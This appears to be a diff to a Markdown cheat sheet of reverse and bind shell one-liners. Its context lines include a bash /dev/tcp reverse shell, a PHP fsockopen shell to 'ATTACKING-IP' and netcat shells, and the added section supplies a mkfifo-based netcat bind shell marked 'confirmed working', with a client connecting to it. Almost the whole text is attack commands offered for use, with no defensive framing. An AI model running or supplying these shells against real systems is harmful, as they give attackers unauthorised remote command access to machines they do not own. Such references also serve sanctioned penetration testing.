@@ -93,7 +93,7 @@ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
-### Netcat
+### Netcat (nc)
 
 **Bind shell**
 
@@ -133,6 +133,23 @@ nc -e /bin/sh ATTACKING-IP 80
 ```
 rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
 
+```
+
+**Without -e flag v2 (confirmed working)**
+
+
+On ‘server’ side:
+
+```
+$ rm -f /tmp/f; mkfifo /tmp/f
+$ cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1234 > /tmp/f
+```
+
+ On ‘client’ side:
+
+```
+$ nc host.example.com 1234
+$ (shell prompt from host.example.com)
 ```
 
 Upgrade Netcat shell to an interactive: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
